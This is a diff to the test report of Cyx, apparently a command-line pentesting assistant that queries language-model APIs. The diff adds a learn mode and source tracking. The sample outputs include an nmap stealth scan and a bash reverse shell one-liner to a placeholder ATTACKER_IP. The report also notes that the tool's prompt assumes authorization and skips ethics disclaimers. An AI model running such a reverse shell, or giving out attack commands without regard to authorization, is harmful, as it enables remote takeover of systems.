@@ -19,22 +19,79 @@ Cyx has been fully tested and is **production-ready**. All features work correct
 
 | Flag | Purpose | Status |
 |------|---------|--------|
-| `--quiet` | Only show final response (no banners) | [X] Working |
+| `--quiet` | Only show final response (no banners/sources) | [X] Working |
 | `--verbose` | Show detailed debugging info | [X] Working |
 | `--no-tty` | Disable colors/prompts for scripting | [X] Working |
+| `--learn` / `-l` | Educational mode with detailed breakdowns | [X] Working |
 
 ## Features Tested
 
 ### [X] One-Shot Queries
+
+**Normal Mode:**
 ```bash
-# Works perfectly - straight to the point results
+cargo run -- --no-tty "nmap stealth scan"
+```
+**Output:**
+```
+[*] COMMAND RESULT
+───────────────────────────────────────
+nmap -sS <target>
+TCP SYN scan - doesn't complete handshake. Requires root.
+
+[*] SOURCES
+───────────────────────────────────────
+Provider: Perplexity (sonar-pro)
+Search: Yes (performed web search)
+```
+
+**Quiet Mode:**
+```bash
 cargo run -- --no-tty --quiet "nmap stealth scan"
 ```
 **Output:**
-```bash
-nmap -sS <target>
 ```
-Brief explanation with citations.
+nmap -sS <target>
+Brief explanation.
+```
+(No headers or sources in quiet mode)
+
+### [X] Learn Mode - Educational Breakdowns
+**NEW FEATURE:** Detailed educational mode activated with `--learn` or `-l`
+
+```bash
+cargo run -- --no-tty --learn "nmap stealth scan"
+```
+
+**Output includes:**
+- Tool description (author, license, purpose)
+- Detailed flag explanations with technical depth
+- How it works (step-by-step process)
+- Advantages and disadvantages
+- When to use vs alternatives
+- Example usage scenarios
+- **Cited sources** (RFCs, official docs, manuals)
+
+**Result:** Comprehensive educational content perfect for learning, with sources cited.
+
+### [X] Source Tracking
+**NEW FEATURE:** Every query now shows source information
+
+**Displayed on ALL responses:**
+```
+[*] SOURCES
+───────────────────────────────────────
+Provider: Perplexity (sonar-pro)
+Search: Yes (performed web search)
+```
+
+**For Groq:**
+```
+Provider: Groq (llama-3.3-70b-versatile)
+Search: No (knowledge base only)
+```
+
+**Result:** Full transparency on whether AI performed web search or used knowledge base.
 
 ### [X] LLM System Prompt Optimization
 **Design:**
@@ -43,8 +100,9 @@ Brief explanation with citations.
 - Code blocks for all commands
 - 1-2 sentence explanations max
 - Assumes user has authorization (skips ethics disclaimers)
+- **Learn mode:** Comprehensive breakdowns with sources
 
-**Result:** Responses are concise, actionable, and professional.
+**Result:** Responses are concise, actionable, and professional. Learn mode provides deep education.
 
 ### [X] Security-Focused Queries Tested
 
@@ -90,8 +148,10 @@ cargo run -- config get provider
 
 | Provider | Model | Status | Notes |
 |----------|-------|--------|-------|
-| Perplexity | `sonar-pro` | [X] Tested | Fast responses, excellent for cybersec |
-| Groq | `llama-3.3-70b-versatile` | [X] Implemented | Very fast, free tier available |
+| Perplexity | `sonar-pro` | [X] Tested | Fast responses, web search enabled |
+| Groq | `llama-3.3-70b-versatile` | [X] Tested | Very fast, knowledge base only |
+
+**Source Tracking:** Both providers now clearly indicate whether they performed web search or used knowledge base.
 
 ## Performance Metrics
 
@@ -104,7 +164,9 @@ cargo run -- config get provider
 
 ### Strengths
 [X] **Extremely fast responses** - Perplexity sonar-pro is optimized for speed
-[X] **Straight to the point** - No unnecessary explanations
+[X] **Straight to the point** - No unnecessary explanations (normal mode)
+[X] **Learn mode** - Deep educational breakdowns when needed
+[X] **Source tracking** - Full transparency on provider and search capability
 [X] **Commands first** - Exactly what pentesters need
 [X] **Beautiful formatting** - Code blocks, tables, colored output
 [X] **Easy setup** - Single command: `cyx setup`
@@ -112,17 +174,33 @@ cargo run -- config get provider
 
 ### Output Quality Examples
 
-#### Query: "nmap stealth scan"
+#### Normal Mode Query: "nmap stealth scan"
 ```bash
 nmap -sS <target>
 ```
 -sS performs a TCP SYN (stealth) scan. Root privileges required.
+
+**Sources shown:** Provider: Perplexity (sonar-pro), Search: Yes
+
+#### Learn Mode Query: "nmap stealth scan"
+Returns comprehensive breakdown with:
+- Tool: nmap (Network Mapper) - author, license, purpose
+- Flags: -sS detailed explanation with technical depth
+- How it works: 4-step process explanation
+- Advantages: Fast, stealthy, reliable
+- Disadvantages: Requires root, detectable by modern IDS
+- When to use: Default reconnaissance, root access available
+- Alternatives: -sT, -sN, -sF comparison
+- Examples: Multiple real-world usage scenarios
+- **Sources: nmap official documentation, RFC 793 (TCP)**
 
 #### Query: "reverse shell one liner bash"
 ```bash
 bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
 ```
 Fastest Bash reverse shell - replace ATTACKER_IP and PORT with your listener.
+
+**Sources shown:** Provider details and search status
 
 ## Build & Installation
 
